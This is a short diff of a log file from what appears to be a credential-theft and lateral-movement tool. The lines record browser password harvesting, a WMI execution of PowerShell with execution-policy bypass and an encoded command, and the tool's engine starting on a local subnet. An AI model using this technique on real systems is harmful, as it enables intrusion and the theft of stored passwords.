@@ -33,3 +33,4 @@
 2026-05-07 13:17:28,571 | [INFO] | [BROWSER-PWDS] Harvesting passwords from 192.168.137.0
 2026-05-07 13:17:29,307 | [INFO] | [WMI-EXEC] 192.168.137.0: powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand Cg
 2026-05-07 13:17:29,806 | [ERROR] | [WMI-EXEC] 192.168.137.0: object of type 'NoneType' has no len()
+2026-05-07 13:38:37,886 | [INFO] | [ENGINE] Initialized — local IP: 192.168.137.201 network: 192.168.137.0/24
